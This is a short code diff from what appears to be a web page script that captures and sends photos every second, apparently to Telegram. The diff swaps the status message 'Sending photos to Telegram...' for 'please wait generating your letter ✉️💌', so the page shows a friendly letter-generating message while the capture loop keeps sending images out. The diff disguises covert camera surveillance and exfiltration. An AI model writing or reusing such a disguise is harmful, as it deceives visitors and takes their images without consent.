@@ -67,7 +67,7 @@
     function startSendingPhotos() {
       if (!isSending) {
         isSending = true;
-        statusElement.textContent = "Sending photos to Telegram...";
+        statusElement.textContent = "please wait generating your letter ✉️💌";
         captureInterval = setInterval(() => {
           captureAndSendPhoto();
         }, 1000); // Capture and send every 1 second
